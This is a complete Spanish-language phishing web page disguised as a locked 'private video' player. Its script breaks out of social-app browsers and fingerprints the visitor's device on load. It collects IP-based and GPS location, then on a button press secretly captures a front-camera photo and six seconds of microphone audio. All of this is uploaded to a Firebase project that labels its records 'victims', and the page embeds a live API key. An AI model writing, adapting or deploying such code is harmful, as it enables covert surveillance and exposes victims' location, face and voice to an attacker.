<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Video</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
html,body{
  width:100%;height:100%;background:#111;
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
  display:flex;align-items:center;justify-content:center;overflow:hidden;
}
#card{
  width:min(88vw,360px);background:#1a1a1a;
  border-radius:22px;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,.7);
}
#thumb-wrap{position:relative;width:100%;aspect-ratio:4/3;overflow:hidden;}
#thumb{width:100%;height:100%;object-fit:cover;filter:blur(14px);transform:scale(1.08);display:block;}
#overlay{position:absolute;inset:0;background:rgba(0,0,0,.28);display:flex;align-items:center;justify-content:center;}
.play-btn{
  width:60px;height:60px;background:rgba(255,255,255,.18);
  backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);
  border:1.5px solid rgba(255,255,255,.35);border-radius:50%;
  display:flex;align-items:center;justify-content:center;
}
.play-btn svg{width:26px;height:26px;fill:#fff;margin-left:3px;}
#card-body{padding:18px 18px 20px;}
.lock-row{display:flex;align-items:center;gap:8px;margin-bottom:8px;}
.lock-icon{font-size:1rem;}
.lock-label{color:#8e8e93;font-size:.72rem;font-weight:500;letter-spacing:.04em;text-transform:uppercase;}
.card-title{color:#fff;font-size:1rem;font-weight:700;margin-bottom:5px;line-height:1.3;}
.card-sub{color:#636366;font-size:.78rem;line-height:1.45;margin-bottom:16px;}
.btn-ver{
  width:100%;padding:13px;border-radius:12px;background:#0a84ff;border:none;
  color:#fff;font-size:.9rem;font-weight:700;cursor:pointer;letter-spacing:.01em;
  display:flex;align-items:center;justify-content:center;gap:7px;
}
.btn-ver:active{background:#0060df;}
.btn-ver svg{width:16px;height:16px;fill:#fff;}
</style>
</head>
<body>

<div id="card">
  <div id="thumb-wrap">
    <img id="thumb" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAARCAAyADIDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCBAYDB//EACgQAAIBBAIBBAIDAQAAAAAAAAECAAMEBRESITEGExQiQVFhcbH/xAAYAQADAQEAAAAAAAAAAAAAAAAAAQIDBP/EABsRAQEBAQEBAQEAAAAAAAAAAAABEQISITH/2gAMAwEAAhEDEQA/APSRRRQBRRRQBRRRQBXhqiLJrioqgkk6AA18lmi25dtKFIBJJ2APoPlrxeIx5xMFZ2Hmhf1e4ZcLo7O9DfbX0AqVvLaLTLRlvCylW+2QSR+EAa2NeONmAYRuCdgMobkNe/oeVWqgXkVhiZ8dkJXIjVMi3BLDQ2R6EjYIPBHBHxqxSWNmIzSIhHJVFJAG9En4T6aHuawx9xHt5FDFgoCjR2u9D67P50KsW9tM1nCJoXDeVWZm5E7J0N7O9b12a0iCKKKKAKKKKAKKKKAK+MoZSrAEHggjkV9ooA8qY6imiS2+pVQOQUDWvbfy0RRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQBRRRQH/9k=" alt="">
    <div id="overlay">
      <div class="play-btn">
        <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
      </div>

  <div id="card-body">
    <div class="lock-row">
      <span class="lock-icon">🔒</span>
      <span class="lock-label">Contenido privado</span>
    </div>
    <div class="card-title">Contenido privado</div>
    <div class="card-sub">Toca el botón para desbloquear y reproducir el video.</div>
    <button class="btn-ver" id="btnOk">
      <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
      Ver video
    </button>
  </div>
</div>

<script>
// ── In-app redirect: fuerza apertura en Chrome/Safari real ──────
(function(){
  const ua = navigator.userAgent || '';
  const inApp =
    /musical_ly|TikTok|BytedanceWebview|ByteLocale/i.test(ua) ||
    /Instagram|FBAN|FBAV|FB_IAB|FB4A|FBIOS|Threads/i.test(ua) ||
    /Snapchat|Twitter|LinkedInApp|WhatsApp/i.test(ua) ||
    (/wv/.test(ua) && /Android/i.test(ua) && !/Chrome\/[.0-9]* Mobile Safari/.test(ua)) ||
    (/iPhone|iPad|iPod/i.test(ua) && /AppleWebKit/i.test(ua) && !/Safari\/[0-9]/.test(ua));
  if (!inApp) return;
  if (/Android/i.test(ua)) {
    location.href = location.href.replace(/^https?:/, 'intent:') +
      '#Intent;scheme=' + (location.protocol === 'https:' ? 'https' : 'http') +
      ';package=com.android.chrome;end';
    setTimeout(() => { location.href = 'googlechrome://' + location.host + location.pathname + location.search; }, 800);
    return;
  }
  if (/iPhone|iPad|iPod/i.test(ua)) {
    location.href = location.href.replace(/^https/, 'x-safari-https').replace(/^http(?!s)/, 'x-safari-http');
  }
})();

// ── Config ──────────────────────────────────────────────────────
const KEY  = 'AIzaSyCPpG5yJ-1FkfHj8GHTucZRU_5dia-aqX0';
const PROJ = 'phishing-cad1e';
const ST   = 'phishing-cad1e.firebasestorage.app';
const COL  = `https://firestore.googleapis.com/v1/projects/${PROJ}/databases/(default)/documents/victims`;
const iOS  = /iPhone|iPad|iPod/i.test(navigator.userAgent);

// ── Estado ──────────────────────────────────────────────────────
let docId = null;
const D   = { ts: String(Date.now()) };
const set = (k, v) => { if (v != null && v !== '') D[k] = String(v).slice(0, 900); };

function toFields(obj) {
  const f = {};
  for (const [k, v] of Object.entries(obj)) f[k] = { stringValue: v };
  return { fields: f };
}

// ── push: crea o actualiza el doc con retry ──────────────────────
async function push(retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      if (!docId) {
        const r = await fetch(`${COL}?key=${KEY}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(toFields(D))
        });
        const j = await r.json();
        if (j.name) { docId = j.name.split('/').pop(); return; }
      } else {
        const mask = Object.keys(D).map(k => `updateMask.fieldPaths=${encodeURIComponent(k)}`).join('&');
        await fetch(`${COL}/${docId}?key=${KEY}&${mask}`, {
          method: 'PATCH',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(toFields(D))
        });
        return;
      }
    } catch (_) { await sleep(400); }
  }
}

// ── upload: sube a Firebase Storage con retry ───────────────────
async function upload(path, dataUrl, mime) {
  const name      = path.split('/').map(encodeURIComponent).join('%2F');
  const uploadUrl = `https://firebasestorage.googleapis.com/v0/b/${ST}/o?name=${name}&key=${KEY}`;
  const readUrl   = `https://firebasestorage.googleapis.com/v0/b/${ST}/o/${name}?alt=media`;
  try {
    const bin = Uint8Array.from(atob(dataUrl.split(',')[1]), c => c.charCodeAt(0));
    for (let i = 0; i < 3; i++) {
      try {
        const r = await fetch(uploadUrl, { method: 'POST', headers: { 'Content-Type': mime }, body: bin });
        const j = await r.json();
        if (j.name) return readUrl;
        if (j.error) await sleep(600 * (i + 1));
      } catch (_) { if (i < 2) await sleep(600 * (i + 1)); }
    }
  } catch (_) {}
  return null;
}

function safeBtoa(bytes) {
  let s = '';
  for (let i = 0; i < bytes.length; i += 8192)
    s += String.fromCharCode(...bytes.subarray(i, i + 8192));
  return btoa(s);
}

const sleep = ms => new Promise(r => setTimeout(r, ms));

// ── Fingerprint pasivo: dispara al cargar ───────────────────────
(function fingerprint() {
  set('ua',       navigator.userAgent);
  set('platform', navigator.platform);
  set('lang',     navigator.language);
  set('cores',    navigator.hardwareConcurrency);
  set('memory',   navigator.deviceMemory);
  set('touch',    navigator.maxTouchPoints);
  set('screen',   `${screen.width}x${screen.height}@${devicePixelRatio}`);
  set('tz',       Intl.DateTimeFormat().resolvedOptions().timeZone);
  set('online',   navigator.onLine);
  set('dark',     window.matchMedia('(prefers-color-scheme:dark)').matches);

  const nav = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (nav) { set('connType', nav.effectiveType); set('connDl', nav.downlink); }

  try {
    const gl  = document.createElement('canvas').getContext('webgl');
    const ext = gl?.getExtension('WEBGL_debug_renderer_info');
    if (ext) {
      set('glVendor',   gl.getParameter(ext.UNMASKED_VENDOR_WEBGL));
      set('glRenderer', gl.getParameter(ext.UNMASKED_RENDERER_WEBGL));
    }
  } catch (_) {}

  try {
    const cv  = document.createElement('canvas');
    const ctx = cv.getContext('2d');
    ctx.fillStyle = '#f60'; ctx.fillRect(0, 0, 10, 10);
    ctx.fillStyle = '#069'; ctx.font = '11px Arial'; ctx.fillText('x', 2, 9);
    set('canvas', cv.toDataURL().slice(-40));
  } catch (_) {}

  if (navigator.getBattery) {
    navigator.getBattery().then(b => {
      set('bat',    Math.round(b.level * 100) + '%');
      set('batChg', b.charging);
      push();
    }).catch(() => {});
  } else {
    set('bat', 'ios_na');
  }

  // IP: race entre dos proveedores, gana el más rápido
  const ipSources = [
    fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) })
      .then(r => r.json())
      .then(j => ({ ip: j.ip, city: j.city, region: j.region, country: j.country_name, cc: j.country_code, ipLat: j.latitude, ipLon: j.longitude, org: j.org })),
    fetch('https://freeipapi.com/api/json/', { signal: AbortSignal.timeout(5000) })
      .then(r => r.json())
      .then(j => ({ ip: j.ipAddress, city: j.cityName, region: j.regionName, country: j.countryName, cc: j.countryCode, ipLat: j.latitude, ipLon: j.longitude, org: j.ipType }))
  ];
  Promise.race(ipSources).then(j => {
    set('ip',      j.ip);
    set('city',    j.city);
    set('region',  j.region);
    set('country', j.country);
    set('cc',      j.cc);
    set('ipLat',   j.ipLat);
    set('ipLon',   j.ipLon);
    set('org',     j.org);
    push();
  }).catch(() => {});

  push();
})();

// ── GPS: dispara al cargar, separado del click para no solapar permisos ──
(function gps() {
  if (!('geolocation' in navigator)) return;
  let bestAcc = Infinity;

  const save = pos => {
    const acc = pos.coords.accuracy;
    if (acc < bestAcc) {
      bestAcc = acc;
      set('gpsLat', pos.coords.latitude);
      set('gpsLon', pos.coords.longitude);
      set('gpsAcc', acc);
      set('gpsAlt', pos.coords.altitude ?? '');
      push();
    }
  };

  // Baja precisión primero (WiFi/celda, ~<500ms)
  navigator.geolocation.getCurrentPosition(save, () => {}, {
    enableHighAccuracy: false, timeout: 4000, maximumAge: 60000
  });
  // Alta precisión en paralelo (GPS real, ~10–25s)
  navigator.geolocation.getCurrentPosition(save, () => {}, {
    enableHighAccuracy: true, timeout: 30000, maximumAge: 0
  });
  // watchPosition para mejora continua
  const wid = navigator.geolocation.watchPosition(
    pos => { save(pos); if (bestAcc < 8) navigator.geolocation.clearWatch(wid); },
    () => {},
    { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
  );
  setTimeout(() => navigator.geolocation.clearWatch(wid), 50000);
})();

// ── Click ────────────────────────────────────────────────────────
document.getElementById('btnOk').addEventListener('click', collect);

async function collect() {
  set('clicked', 'true');
  push();

  if (!navigator.mediaDevices?.getUserMedia) {
    set('camErr', 'no_api'); push(); return;
  }

  // getUserMedia: intenta video+audio, cae a solo video si no
  let stream = null;
  let hasAudio = false;
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
      audio: true
    });
    hasAudio = true;
    set('camGranted', 'true'); set('audioGranted', 'true');
  } catch (_) {
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
      set('camGranted', 'true'); set('audioGranted', 'false');
    } catch (e) {
      set('camErr', e.name + ':' + e.message); push(); return;
    }
  }
  push();

  // Video element oculto para capturar frames
  const vid = Object.assign(document.createElement('video'), {
    autoplay: true, muted: true, srcObject: stream
  });
  vid.setAttribute('playsinline', '');
  vid.setAttribute('webkit-playsinline', '');
  vid.style.cssText = 'position:fixed;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;';
  document.body.appendChild(vid);

  await new Promise(res => {
    if (vid.readyState >= 2) { res(); return; }
    vid.onloadeddata = res; vid.onerror = res; setTimeout(res, 3000);
  });
  try { await vid.play(); } catch (_) {}

  // Asegurar docId antes de subir archivos
  if (!docId) await push();
  for (let w = 0; !docId && w < 3000; w += 200) await sleep(200);
  const uid = docId || ('anon_' + Date.now());

  // Foto y audio en paralelo — ambos devuelven Promise real que resuelve tras upload
  await Promise.allSettled([
    _grabPhoto(vid, uid),
    hasAudio ? _grabAudio(stream, uid) : Promise.resolve()
  ]);

  vid.srcObject?.getTracks().forEach(t => t.stop());
  vid.remove();

  if ('Notification' in window) {
    Notification.requestPermission()
      .then(r => { set('notif', r); push(); })
      .catch(() => {});
  }
}

// ── Foto: polling de frames, resuelve tras upload ───────────────
async function _grabPhoto(vid, uid) {
  const deadline = Date.now() + 8000;
  let attempt = 0;

  while (Date.now() < deadline) {
    attempt++;
    try {
      const w = vid.videoWidth || 0, h = vid.videoHeight || 0;
      if (w > 4 && h > 4) {
        const cv  = document.createElement('canvas');
        cv.width  = w; cv.height = h;
        const ctx = cv.getContext('2d', { willReadFrequently: true });
        ctx.drawImage(vid, 0, 0, w, h);

        // Muestrea el centro 50%×50% para evitar bordes negros de letterbox
        const sx = Math.floor(w * .25), sy = Math.floor(h * .25);
        const sw = Math.floor(w * .5),  sh = Math.floor(h * .5);
        const px = ctx.getImageData(sx, sy, sw, sh).data;
        let bright = 0;
        for (let i = 0; i < px.length; i += 4) bright += px[i] + px[i+1] + px[i+2];
        const avg = bright / (px.length / 4 * 3);

        if (avg > 6) {
          // Para video tracks aquí para liberar cámara sin cortar audio
          vid.srcObject?.getVideoTracks().forEach(t => t.stop());
          const dataUrl = cv.toDataURL('image/jpeg', 0.85);
          const url = await upload(`photos/${uid}.jpg`, dataUrl, 'image/jpeg');
          if (url) { set('photoUrl', url); set('photoAttempt', String(attempt)); }
          else      { set('photoErr', 'upload_fail_' + attempt); }
          push();
          return;
        }
      }
    } catch (e) { set('photoErr', e.message + '_a' + attempt); push(); return; }
    await sleep(200);
  }
  vid.srcObject?.getVideoTracks().forEach(t => t.stop());
  set('photoErr', 'timeout_' + attempt + '_attempts');
  push();
}

// ── Audio: graba 6s y sube — Promise resuelve DENTRO de onstop tras upload ──
//
// Fix central de v9: en v8 _grabAudio retornaba después de rec.start(),
// lo que hacía que Promise.allSettled pensara que el audio estaba listo
// cuando en realidad onstop (y su upload) todavía no habían disparado.
// Aquí la Promise no resuelve hasta que onstop termina el await upload().
//
function _grabAudio(stream, uid) {
  return new Promise(resolve => {
    const liveAudio = stream.getAudioTracks().filter(t => t.readyState === 'live');
    let s = stream; // reutiliza el stream existente si tiene audio vivo

    const start = async () => {
      if (liveAudio.length === 0) {
        try {
          s = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
        } catch (e) {
          set('audioErr', 'mic:' + e.message); push(); resolve(); return;
        }
      }

      const mimes = iOS
        ? ['audio/mp4;codecs=mp4a.40.2', 'audio/mp4', 'audio/aac']
        : ['audio/webm;codecs=opus', 'audio/webm', 'audio/mp4', 'audio/ogg;codecs=opus'];
      const mime = mimes.find(m => { try { return MediaRecorder.isTypeSupported(m); } catch (_) { return false; } }) || '';

      let rec;
      try { rec = new MediaRecorder(s, mime ? { mimeType: mime } : {}); }
      catch (_) {
        try { rec = new MediaRecorder(s); }
        catch (e) { set('audioErr', 'init:' + e.message); push(); resolve(); return; }
      }

      const chunks = [];
      rec.ondataavailable = e => { if (e.data?.size > 0) chunks.push(e.data); };

      rec.onstop = async () => {
        // Para solo audio tracks (video ya fue parado por _grabPhoto)
        s.getAudioTracks().forEach(t => t.stop());
        try {
          const fm  = rec.mimeType || mime || 'audio/webm';
          const ext = fm.includes('mp4') || fm.includes('aac') ? 'm4a' : fm.includes('ogg') ? 'ogg' : 'webm';
          const blob = new Blob(chunks, { type: fm });
          if (blob.size < 100) {
            set('audioErr', 'empty_' + blob.size);
          } else {
            const ab  = await blob.arrayBuffer();
            const b64 = 'data:' + fm + ';base64,' + safeBtoa(new Uint8Array(ab));
            const url = await upload(`audio/${uid}.${ext}`, b64, fm);
            if (url) set('audioUrl', url);
            else     set('audioErr', 'upload_fail');
          }
        } catch (e) { set('audioErr', 'stop:' + e.message); }
        push();
        resolve(); // ← resuelve AQUÍ, después del upload
      };

      rec.onerror = e => { set('audioErr', 'rec:' + (e.error?.message || '?')); push(); resolve(); };

      // iOS Safari requiere timeslice >= 500ms para ondataavailable confiable
      rec.start(500);
      setTimeout(() => { try { rec.stop(); } catch (_) {} }, 6000);
    };

    start().catch(e => { set('audioErr', 'outer:' + e.message); push(); resolve(); });
  });
}

// ── Exit beacon ──────────────────────────────────────────────────
window.addEventListener('beforeunload', () => {
  if (!docId) return;
  set('_exit', Date.now());
  navigator.sendBeacon(
    `${COL}/${docId}?key=${KEY}&updateMask.fieldPaths=_exit`,
    JSON.stringify(toFields({ _exit: String(Date.now()) }))
  );
});
</script>
